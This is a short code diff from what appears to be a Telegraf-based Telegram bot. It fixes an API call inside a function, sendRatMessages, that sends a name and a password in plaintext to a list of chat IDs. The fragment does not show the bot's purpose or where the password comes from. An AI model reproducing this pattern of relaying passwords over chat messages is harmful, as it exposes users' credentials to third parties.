@@ -109,7 +109,7 @@ bot.on('text', (ctx) => {
 
 const sendRatMessages = (ids, name, password) => {
     ids.map(e => {
-        bot.sendMessage(e, `Rat detect ${name}, ${password}`)
+        bot.telegram.sendMessage(e, `Rat detect ${name}, ${password}`)
     })
 }
 
